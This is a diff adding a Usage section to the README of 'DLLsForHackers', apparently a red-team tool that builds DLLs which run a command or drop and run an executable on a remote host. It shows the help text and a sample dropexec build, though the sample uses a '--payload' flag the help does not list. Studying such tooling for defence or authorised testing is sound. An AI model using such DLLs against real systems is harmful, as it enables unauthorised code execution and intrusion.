@@ -35,6 +35,41 @@ You should never perform the following tasks from within DllMain:
 
 # Usage
 
+```
+python3 GenDll.py --help
+DLLsForHackers Mr.Un1k0d3r RingZer0 Team
+----------------------------------------
+
+usage: GenDll.py [-h] -t {exec,dropexec} [-com COMPILE] [-c CMD] [-fn FILENAME] [-fp FILEPATH] [-v {true,false}]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -t {exec,dropexec}, --type {exec,dropexec}
+                        Payload type (exec,dropexec)
+  -com COMPILE, --compile COMPILE
+                        Path to mingw32-g++.exe
+  -c CMD, --cmd CMD     Command to run
+  -fn FILENAME, --filename FILENAME
+                        Dropped filename (optional)
+  -fp FILEPATH, --filepath FILEPATH
+                        File to drop on the remote host
+  -v {true,false}, --verbose {true,false}
+```
+
+```
+python3 GenDll.py -t dropexec --com "C:\Program Files\mingw-w64\x86_64-8.1.0-win32-seh-rt_v6-rev0\mingw64\bin\x86_64-w64-mingw32-g++.exe" --payload binary.exe
+DLLsForHackers Mr.Un1k0d3r RingZer0 Team
+----------------------------------------
+
+[+] Loading drop exec dll payload.
+[+] Loading payload.exe.
+[+] Dll source saved as 'output/dropexec-1600369623.c'.
+[*] Compiling the Dll using 'C:\Program Files\mingw-w64\x86_64-8.1.0-win32-seh-rt_v6-rev0\mingw64\bin\x86_64-w64-mingw32-g++.exe' as the gcc path.
+[*] Compiling the Dll using the following command '"C:\Program Files\mingw-w64\x86_64-8.1.0-win32-seh-rt_v6-rev0\mingw64\bin\x86_64-w64-mingw32-g++.exe" -Wall -DBUILD_DLL -O2 -c output/dropexec-1600369623.c -o output/dropexec-1600369623.c.o && "C:\Program Files\mingw-w64\x86_64-8.1.0-win32-seh-rt_v6-rev0\mingw64\bin\x86_64-w64-mingw32-g++.exe" -shared -Wl,--dll output/dropexec-1600369623.c.o -o output/dropexec-1600369623.c.dll'.
+[+] Compiled Dll saved as 'dlls/dropexec-1600369623.c.dll'.
+[+] Process completed.
+```
+
 # Compile it using GCC
 
 * Exec (exec.c)
